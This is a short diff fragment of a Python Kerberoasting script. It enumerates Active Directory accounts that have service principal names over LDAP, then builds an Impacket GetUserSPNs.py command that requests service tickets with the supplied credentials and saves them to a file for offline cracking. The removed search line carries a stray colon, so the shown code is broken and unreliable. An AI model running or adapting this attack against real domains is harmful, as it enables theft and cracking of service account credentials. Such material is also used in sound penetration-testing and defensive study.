@@ -11,7 +11,6 @@ def find_and_kerberoast_objects(username, password, domain, dc_ip):
         search_base = 'DC=' + ',DC='.join(domain.split('.'))
         search_filter = '(servicePrincipalName=*)'
         attributes = ['sAMAccountName', 'servicePrincipalName']
-        conn.search(search_base, search_filter, SUBTREE, attributes=attributes):
         sAMAccountName = entry['sAMAccountName'].value
         print(f"Kerberoasting {sAMAccountName}...")
         cmd = f"GetUserSPNs.py -request -dc-ip {dc_ip} -outputfile krbtickets.txt -u {username}@{domain}:{password}"
